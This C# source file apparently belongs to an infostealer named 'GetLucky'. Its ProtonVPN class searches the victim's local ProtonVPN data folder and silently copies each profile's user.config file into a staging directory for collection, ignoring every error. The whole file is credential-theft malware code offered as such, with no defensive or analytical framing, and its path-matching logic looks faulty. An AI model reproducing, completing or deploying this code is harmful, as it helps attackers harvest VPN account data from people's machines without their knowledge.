using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace GetLucky
{
    class ProtonVPN
    {
        public static int count = 0;
        public static void GetProtonVPN(string GetLucky_Dir)
        {
            try
            {
                string dir = Help.LocalData + "\\ProtonVPN";
                if (Directory.Exists(dir))
                {
                    string[] dirs = Directory.GetDirectories(dir + "");
                    Directory.CreateDirectory(GetLucky_Dir + "\\VPN\\ProtonVPN\\");
                    foreach (string d1rs in dirs)
                    {
                        if (d1rs.StartsWith(dir + "\\ProtonVPN" + "\\ProtonVPN.exe"))
                        {
                            string dirName = new DirectoryInfo(d1rs).Name;
                            string[] d1 = Directory.GetDirectories(d1rs);
                            Directory.CreateDirectory(GetLucky_Dir + "\\VPN\\ProtonVPN\\" + dirName + "\\" + new DirectoryInfo(d1[0]).Name);
                            File.Copy(d1[0] + "\\user.config", GetLucky_Dir + "\\VPN\\ProtonVPN\\" + dirName + "\\" + new DirectoryInfo(d1[0]).Name + "\\user.config");
                            count++;
                        }
                    }
                }
                else
                { 
                    return;
                }
            }
            catch  {}

        }
    }
}
